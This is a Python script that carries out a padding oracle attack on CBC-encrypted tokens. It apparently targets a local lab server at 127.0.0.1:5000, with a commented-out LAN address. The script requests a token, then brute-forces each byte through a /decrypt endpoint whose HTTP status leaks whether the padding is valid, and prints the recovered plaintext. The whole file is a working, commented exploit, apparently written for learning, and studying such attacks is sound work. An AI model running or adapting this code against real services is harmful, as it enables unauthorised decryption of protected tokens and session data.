import base64
import requests
from Cryptodome.Util.Padding import pad, unpad



# Configuration

BLOCK_SIZE = 8
SERVER = "http://127.0.0.1:5000"
#SERVER = "http://192.168.1.52:5000"


# Padding oracle that checks whether the plaintext is correctly formatted in terms of PKCS#7 padding

def oracle(ciphertext: bytes) -> bool:
    
    # If the plaintext is correctly formatted in terms of padding, the server returns HTTP status code 200

    token = base64.b64encode(ciphertext).decode()

    r = requests.post(
        f"{SERVER}/decrypt",
        json={"token": token}
    )

    return r.status_code == 200



# Split the ciphertext into 8-byte blocks

def split_blocks(data: bytes, size: int = 8):
    
    blocks = []
    
    # Iterates through the data, moving forward by "size" bytes at a time
    for i in range(0, len(data), size):

        # Extracts the current block (from index i to i + size)
        current_block = data[i : i + size]
        blocks.append(current_block)
        
    return blocks



# Padding Oracle Attack

def decrypt_block(prev_block, current_block):
    
    intermediate = [0] * BLOCK_SIZE
    plaintext = [0] * BLOCK_SIZE

    for pad_value in range(1, BLOCK_SIZE + 1):
        
        # Initializes 'crafted' at each iteration to start with a clean copy
        crafted = bytearray(prev_block)
        index = BLOCK_SIZE - pad_value

        # Updates the bytes already recovered
        for j in range(BLOCK_SIZE - 1, index, -1):
            crafted[j] = intermediate[j] ^ pad_value

        # Prevention of false positives
        # We alter the penultimate byte only when looking for
        # the first padding byte (pad_value == 1)
        if pad_value == 1 and index > 0:
            crafted[index - 1] ^= 0xFF

        found = False

        for guess in range(256): # brute-force the possible values of a byte (from 0 to 255)
            
            crafted[index] = guess

            forged = bytes(crafted) + current_block

            if oracle(forged): # if the padding is correctly formatted

                # Calculate the intermediate byte
                intermediate[index] = guess ^ pad_value
                plaintext[index] = intermediate[index] ^ prev_block[index]

                # Prevent strange terminal output if the character is not printable
                char_repr = chr(plaintext[index]) if 32 <= plaintext[index] <= 126 else '.'
                
                print(
                    f"Byte found [{index}] -> "
                    f"{plaintext[index]:02x} ({char_repr})"
                )

                found = True
                break

        if not found:
            raise Exception(f"Byte not found at index {index}")

    return bytes(plaintext)



# Main

def main():
    
    r = requests.get(f"{SERVER}/token")

    token_b64 = r.json()["token"]

    #print("\ntoken",token_b64)

    raw = base64.b64decode(token_b64)

    #print("\nraw", raw)

    blocks = split_blocks(raw, BLOCK_SIZE)

    print(f"Blocks found: {len(blocks)-1} + IV")
    
    for i, b in enumerate(blocks):
        print(i, b.hex())

    plaintext = b""

    # Iterate through the ciphertext blocks and decrypt them using the attack
    for i in range(1, len(blocks)):
        print(f"\nDecrypting block {i}")

        p = decrypt_block(blocks[i - 1], blocks[i])
        plaintext += p


    # Remove padding

    plaintext = unpad(plaintext, BLOCK_SIZE)
    print("\n[+] Recovered plaintext:")
    print(plaintext)



if __name__ == "__main__":
    main()
